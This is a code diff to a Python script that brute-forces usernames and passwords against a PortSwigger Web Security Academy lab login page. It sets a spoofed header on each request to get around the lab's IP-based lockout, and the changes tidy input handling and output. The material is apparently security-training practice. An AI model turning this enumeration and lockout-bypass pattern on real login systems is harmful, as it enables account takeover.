@@ -22,7 +22,7 @@ app = typer.Typer()
 
 @app.command()
 def run():
-    lab_id= '0af00053045688ff81d14d5000670080'
+    lab_id= '0acf0036030e70d385dc80c9004a00ac'
     time_limit=0.8
     possible_usernames = []
 
@@ -44,12 +44,13 @@ def run():
             task = progress.add_task("Usernames fuzzing...", total=file_length) 
             for username in file_lines:
                 #print(username)
+                username=username.strip()
         
                 if not username:
                     break
                 response = requests.post(
                                         f"https://{lab_id}.web-security-academy.net/login", data= {
-                                            "username" : username.strip(),
+                                            "username" : username,
                                             "password": password
                                         }, headers={
                                             "host": f"{lab_id}.web-security-academy.net",
@@ -95,6 +96,7 @@ def run():
                 task = progress.add_task(f"Password fuzzing for {username} ...", total=file_length) 
                 for password in file_lines:
                     #print(username)
+                    password=password.strip()
             
                    
                     if not password:
@@ -107,21 +109,23 @@ def run():
                     # `password.strip()`.
                     response = requests.post(
                                             f"https://{lab_id}.web-security-academy.net/login", data= {
-                                                "username" : username.strip(),
-                                                "password": password.strip()
+                                                "username" : username,
+                                                "password": password
                                             }, headers={
                                                 "host": f"{lab_id}.web-security-academy.net",
                                                 "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
 
                                                 "Referer": f"https://{lab_id}.web-security-academy.net/login",
-                                                header_to_bypass_IP_block : password.strip()
+                                                header_to_bypass_IP_block : password
                                             })
             
                     response_text = response.text
                 # print(response.text)
                     if logged_in_string in response_text:
-                        console.print(f'\n leaked credentials {username.strip()}:{password.strip()}', style="info")
+                        console.print(f'\nleaked credentials', style='warning')
+                        console.print(f'{username}:{password}', style="danger")
                         progress.update(task, advance=file_length)
+                        break
                         
                         #user_found=True
 
